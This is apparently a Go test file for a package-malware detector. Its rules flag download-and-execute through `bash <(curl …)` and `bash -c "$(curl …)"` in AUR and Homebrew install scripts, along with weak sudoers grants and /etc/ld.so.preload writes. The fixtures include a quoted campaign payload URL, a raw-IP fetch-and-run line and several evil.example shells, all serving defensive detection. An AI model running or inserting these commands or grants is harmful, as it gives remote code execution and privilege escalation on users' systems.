package detect

import (
	"strings"
	"testing"
)

// Download-and-execute through process and command substitution, and the two new weakness rules
// (weak sudoers grants, /etc/ld.so.preload). From the 2026-10-25 audit of the AUR set-A mints:
// the live 398-package typosquat campaign ran its payload as `bash <(curl …)` at the top level
// of its .install, which no pipe rule could see.

// campaignInstall is sropbox.install (GCVE-110-AUR-2026-005420) as published: empty hooks, then
// the payload outside every function.
const campaignInstall = `post_install() {
  true
}

post_upgrade() {
  post_install
}

bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
`

func evidenceIDs(fs []Finding) []string {
	var out []string
	for _, f := range fs {
		if f.Class == ClassEvidence {
			out = append(out, f.ID)
		}
	}
	return out
}

func TestCampaignInstallProcessSubstitutionIsOverrideEvidence(t *testing.T) {
	f := Detect(&PackageContext{Name: "sropbox", Ecosystem: "aur", InstallScriptContent: campaignInstall})
	if c, ok := classOf(f, "P-INSTALL-PROC-SUB-EXEC"); !ok || c != ClassEvidence {
		t.Fatalf("campaign .install: want P-INSTALL-PROC-SUB-EXEC evidence, got %v", ids(f))
	}
	// override_gate: the verdict no longer rests on the 45-point P-INSTALL-CURL alone.
	for _, p := range patternsBySection["install_script_analysis"] {
		if p.id == "P-INSTALL-PROC-SUB-EXEC" && !p.overrideGate {
			t.Fatal("P-INSTALL-PROC-SUB-EXEC must be override_gate")
		}
	}
	if v := CombinedVerdict(f); !v.Malicious || !v.HighFidelity {
		t.Fatalf("campaign .install: verdict %+v", v)
	}
}

func TestProcessAndCommandSubstitutionShapes(t *testing.T) {
	install := func(src string) []string {
		return evidenceIDs(Detect(hookFixture("aur", src)))
	}
	build := func(eco, src string, exec bool) []string {
		return evidenceIDs(Detect(&PackageContext{Name: "pkg", Ecosystem: eco, PkgbuildContent: src, PkgbuildExecutes: exec}))
	}
	for _, src := range []string{
		"bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)",
		"sh <(wget -qO- http://203.0.113.7/i.sh)",
		"source <(curl -s https://evil.example/env)",
		"  . <(curl -fsSL https://evil.example/env)",
		"/bin/bash <(curl -s https://evil.example/x)",
		"[ -x /usr/bin/curl ] && zsh <(curl -s https://evil.example/x)",
	} {
		if got := install(src); !hasID(got, "P-INSTALL-PROC-SUB-EXEC") {
			t.Errorf("install %q: no P-INSTALL-PROC-SUB-EXEC (%v)", src, got)
		}
		if got := build("aur", src, true); !hasID(got, "P-PROC-SUB-EXEC") {
			t.Errorf("PKGBUILD %q: no P-PROC-SUB-EXEC (%v)", src, got)
		}
	}
	for _, src := range []string{
		`/bin/bash -c "$(curl -fsSL http://64.52.80.235/Socedes)"`,
		`sh -c "$(wget -qO- https://evil.example/i)"`,
		`eval "$(curl -s https://evil.example/env)"`,
		`bash -lc "$(curl -fsSL https://evil.example/i)"`,
	} {
		if got := install(src); !hasID(got, "P-INSTALL-CMD-SUB-EXEC") {
			t.Errorf("install %q: no P-INSTALL-CMD-SUB-EXEC (%v)", src, got)
		}
		if got := build("homebrew", src, true); !hasID(got, "P-CMD-SUB-EXEC") {
			t.Errorf("formula %q: no P-CMD-SUB-EXEC (%v)", src, got)
		}
	}
	// The download is read as data, not run: no rule of this family.
	for _, src := range []string{
		"gpg --verify <(curl https://example.com/v1.2.3/tool.sig) tool",
		"while read l; do echo $l; done < <(curl -s https://h/x) 2>/dev/null",
		"cat <(curl evil.com)",
		"diff <(curl -s https://a/x) local.txt",
		`ver="$(curl -s https://api.github.com/repos/a/b/releases/latest | jq -r .tag_name)"`,
	} {
		got := install(src)
		if hasID(got, "P-INSTALL-PROC-SUB-EXEC") || hasID(got, "P-INSTALL-CMD-SUB-EXEC") {
			t.Errorf("%q fired %v", src, got)
		}
	}
	// hook_only: in pypi/npm library source the same text is a help string (a withdrawn pypi line).
	hint := "bash <(curl -fsSL https://raw.githubusercontent.com/sjmgarnier/agent-natalie/main/install.sh)"
	if got := build("pypi", hint, false); hasID(got, "P-PROC-SUB-EXEC") {
		t.Errorf("pypi library hint fired P-PROC-SUB-EXEC evidence: %v", got)
	}
	if got := build("npm", `console.error("Try:\n  bash <(curl -fsSL YOUR_URL/install)\n");`, false); hasID(got, "P-PROC-SUB-EXEC") {
		t.Errorf("npm console hint fired P-PROC-SUB-EXEC evidence: %v", got)
	}
}

func weakIDs(fs []Finding) []string {
	var out []string
	for _, f := range fs {
		if f.Class == ClassWeakness {
			out = append(out, f.ID)
		}
	}
	return out
}

func TestSudoersWeakGrantIsWeakness(t *testing.T) {
	for _, src := range []string{
		`echo "pluton ALL=(root) NOPASSWD:SETENV: /usr/bin/rclone *, /usr/bin/restic *" > /etc/sudoers.d/pluton-agent`,
		`vpn ALL=(root) NOPASSWD: /usr/bin/iptables *, /usr/bin/nft *`,
		`%wheel ALL=(root) NOPASSWD: /tmp/tytus-helper.sh`,
	} {
		got := weakIDs(Detect(hookFixture("aur", src)))
		if !hasID(got, "P-INSTALL-SUDOERS-WEAK-GRANT") {
			t.Errorf("install %q: no weakness (%v)", src, got)
		}
		got = weakIDs(Detect(&PackageContext{Name: "pkg", Ecosystem: "aur", PkgbuildContent: src, PkgbuildExecutes: true}))
		if !hasID(got, "P-SUDOERS-WEAK-GRANT") {
			t.Errorf("PKGBUILD %q: no weakness (%v)", src, got)
		}
	}
	if got := weakIDs(Detect(hookFixture("aur", "ceph ALL=(root) NOPASSWD: /usr/sbin/smartctl -x /dev/sd[a-z]"))); hasID(got, "P-INSTALL-SUDOERS-WEAK-GRANT") {
		// [a-z] is a bracket, not `*`; a named command with fixed arguments is not a weak grant
		t.Errorf("scoped grant flagged weak: %v", got)
	}
}

func TestLdSoPreloadWriteIsWeakness(t *testing.T) {
	// sundtek.install (GCVE-110-AUR-2026-001692)
	got := weakIDs(Detect(&PackageContext{Name: "sundtek", Ecosystem: "aur", InstallScriptContent: `  echo "/opt/lib/libmediaclient.so" >> /etc/ld.so.preload`}))
	if !hasID(got, "P-INSTALL-LD-SO-PRELOAD") {
		t.Errorf("sundtek preload append: %v", got)
	}
	for _, src := range []string{
		`echo /usr/lib/libx.so | tee -a /etc/ld.so.preload`,
		`printf '%s\n' "$lib" > /etc/ld.so.preload`,
	} {
		if got := weakIDs(Detect(&PackageContext{Name: "p", Ecosystem: "aur", InstallScriptContent: src})); !hasID(got, "P-INSTALL-LD-SO-PRELOAD") {
			t.Errorf("%q: %v", src, got)
		}
	}
	if got := weakIDs(Detect(&PackageContext{Name: "p", Ecosystem: "aur", PkgbuildContent: `install -Dm644 preload "$pkgdir/etc/ld.so.preload"`, PkgbuildExecutes: true})); !hasID(got, "P-LD-SO-PRELOAD") {
		t.Errorf("shipped ld.so.preload: %v", got)
	}
	for _, src := range []string{
		`  echo "inserting /opt/lib/libmediaclient.so in /etc/ld.so.preload"`,
		`  if [ -e /etc/ld.so.preload ]; then`,
		`    sed -i 's#/opt/lib/libmediaclient.so##' /etc/ld.so.preload`,
	} {
		if got := weakIDs(Detect(&PackageContext{Name: "p", Ecosystem: "aur", InstallScriptContent: src})); hasID(got, "P-INSTALL-LD-SO-PRELOAD") {
			t.Errorf("%q flagged: %v", src, got)
		}
	}
	// a weakness never mints
	if IsMalicious(Detect(&PackageContext{Name: "sundtek", Ecosystem: "aur", InstallScriptContent: `echo "/opt/lib/libmediaclient.so" >> /etc/ld.so.preload`})) {
		t.Error("ld.so.preload weakness minted")
	}
}

func TestNewRulesCarryScores(t *testing.T) {
	for _, id := range []string{"P-SUDOERS-WEAK-GRANT", "IS-P-INSTALL-SUDOERS-WEAK-GRANT", "P-INSTALL-LD-SO-PRELOAD", "P-LD-SO-PRELOAD"} {
		cwe, cvss, ok := WeaknessRule(id)
		if !ok || cwe == "" || !strings.HasPrefix(cvss, "CVSS:3.1/") {
			t.Errorf("%s: weakness=%v cwe=%q cvss=%q", id, ok, cwe, cvss)
		}
	}
	if s := SkippedPatterns(); len(s) != 0 {
		t.Fatalf("RE2 rejected: %v", s)
	}
}
